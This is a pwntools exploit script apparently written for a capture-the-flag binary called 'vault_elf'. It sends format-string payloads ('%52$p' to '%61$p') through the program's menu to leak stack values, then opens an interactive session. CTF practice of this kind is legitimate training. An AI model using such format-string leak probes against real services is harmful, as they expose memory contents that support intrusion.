#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 9999
HOST = "chall.cscv.vn"
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            source /home/nhh/pwndbg/gdbinit.py
            b* 0x000000000040153C
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    exe = context.binary = ELF('./vault_elf', checksec=False)
    p = exe.process()

def add(name, data):
    p.sendlineafter(b'>>> ', str(1))
    p.sendafter(b'name: ', name)
    p.sendafter(b'secret: ', data)

def show():
    p.sendlineafter(b'>>> ', str(2))

def login(passwd):
    p.sendlineafter(b'>>> ', str(3))
    p.sendafter(b'password: ', passwd)

# VARIABLE
target = 0x4040a0

# PAYLOAD
for i in range(52, 62):
    add(b'a', f'%{i}$p'.encode())
show()
for i in range(52, 62):
    p.recvuntil(b'Secret: ')
    print((f'%{i}$p'.encode() + b": " + p.recvuntil(b'\n', drop=True)).decode())

p.interactive()